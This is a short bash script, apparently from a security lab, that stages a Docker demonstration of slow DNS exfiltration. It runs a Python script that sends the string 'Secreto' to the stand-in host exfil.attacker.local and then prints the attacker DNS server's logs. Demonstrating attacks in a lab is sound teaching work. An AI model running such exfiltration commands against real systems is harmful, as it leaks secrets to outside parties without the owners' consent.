#!/usr/bin/env bash
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
source "${ROOT}/lib/capture_helpers.sh"
init_compose "p10v" "docker-compose.yml"
trap 'teardown_lab 2>/dev/null || true' EXIT

setup_lab
sleep 4

section "10" "SLOW DNS EXFILTRATION" "VULNERABLE"
prompt_attack "10.9.0.102" "python3 /lab/slow_dns.py exfil.attacker.local Secreto"
run_exec host python3 /lab/slow_dns.py exfil.attacker.local Secreto
sleep 3
blank_line
prompt_server "10.9.0.101" "docker compose logs attacker-dns  # consultas exfiltradas"
${COMPOSE} logs attacker-dns 2>/dev/null | tail -12 || true

teardown_lab
